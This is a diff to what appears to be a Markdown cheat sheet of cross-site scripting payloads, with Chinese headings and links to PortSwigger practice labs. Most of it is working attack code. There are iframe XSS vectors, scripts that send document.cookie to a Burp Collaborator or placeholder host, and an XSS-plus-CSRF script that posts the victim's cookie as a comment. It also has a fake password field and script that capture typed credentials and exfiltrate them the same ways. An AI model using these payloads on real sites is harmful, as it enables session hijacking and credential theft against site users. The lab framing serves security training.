@@ -138,25 +138,16 @@ javascript:alert(233)
 
 *reflected XSS vulnerability in the search functionality*
 ```html
-<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+<iframe src="https://vulnerable-website.com/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```
 
 *jQuery selector sink using a hashchange event*
 ```html
-<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+<iframe src="https://vulnerable-website.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 ```
 
 ## cookies
 
-```javascript
-<script>
-fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
-method: 'POST',
-mode: 'no-cors',
-body:document.cookie
-});
-</script>
-```
 ```javascript
 <script>fetch('https://xxx/?'+btoa(document.cookie));</script>
 ```
@@ -168,6 +159,47 @@ body:document.cookie
 <img src=x onerror="window.location='https://xxx/?'+document.cookie;"/>
 ```
 
+**[portswigger lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)**
+
+```javascript
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+**xss+csrf**
+```bash
+# 从dom中 检索 csrf 令牌
+document.getElementsByName('csrf')[0].value
+# 获取 cookie
+document.cookie
+```
+*制作 CSRF Payload*
+```javascript
+<script>
+window.addEventListener('DOMContentLoaded', function() {
+
+var token = document.getElementsByName('csrf')[0].value
+var data = new FormData();
+
+data.append('csrf', token);
+data.append('postId', 8);
+data.append('comment', document.cookie);
+data.append('name', 'victim');
+data.append('email', 'blah@email.com');
+data.append('website', 'http://blah.com');
+
+fetch('/post/comment', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: data
+});
+});
+</script>
+```
 ---
 
 ## change password
@@ -187,6 +219,45 @@ alert("Action executed!");
 }
 };
 xhr.send('action=execute&new_password=admin123');
+</script>
+```
+
+**[portswigger lab](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)**
+
+```html
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+**xss+csrf**
+
+```html
+<input type="text" name="username">
+<input type="password" name="password" onchange="dothis()">
+
+<script>
+  function dothis() {
+  var username = document.getElementsByName('username')[0].value
+  var password = document.getElementsByName('password')[0].value
+  var token = document.getElementsByName('csrf')[0].value
+  var data = new FormData();
+
+  data.append('csrf', token);
+  data.append('postId', 8); // Change '8' to correct postId
+  data.append('comment', `${username}:${password}`);
+  data.append('name', 'victim');
+  data.append('email', 'blah@email.com');
+  data.append('website', 'http://blah.com');
+
+  fetch('/post/comment', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: data
+  });
+  };
 </script>
 ```
 ---
